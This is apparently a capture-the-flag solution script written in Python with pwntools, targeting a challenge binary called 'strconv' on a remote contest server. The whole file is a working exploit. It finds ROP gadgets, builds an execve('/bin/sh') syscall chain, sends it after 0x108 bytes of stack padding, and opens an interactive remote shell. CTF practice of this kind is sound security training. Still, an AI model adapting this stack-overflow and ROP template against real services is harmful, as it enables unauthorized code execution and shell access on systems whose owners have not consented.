
from pwn import *

BINARY = 'strconv'



def run(exe):
	r = r = remote('strconv.challs.cyberchallenge.it', 37000)

	rop = ROP(exe, badchars='\n')
	pop_rax = rop.find_gadget(['pop rax', 'ret']).address
	pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
	pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
	pop_rdx = rop.find_gadget(['pop rdx', 'pop rbx', 'ret']).address
	syscall = rop.find_gadget(['syscall']).address

	binsh   = next(exe.search(b'/bin/sh\0'))
	nullptr = next(exe.search(b'\0' * 8))

	chain = flat(
		pop_rdi,
		binsh,
		pop_rsi,
		nullptr,
		pop_rdx,
		nullptr,
		0x230,
		pop_rax,
		0x3b,
		syscall
	)

	assert b'\n' not in chain

	payload = b'\0' * 0x108 + chain
	r.sendlineafter(b'> ', b'1')
	r.sendlineafter(b'Input : ', payload)

	r.sendlineafter(b'> ', b'0')
	r.recvuntil(b'Bye bye!\n')
	r.interactive()
	return True


if __name__ == '__main__':
	context(arch='amd64')
	exe = ELF(BINARY, checksec=False)
	run(exe)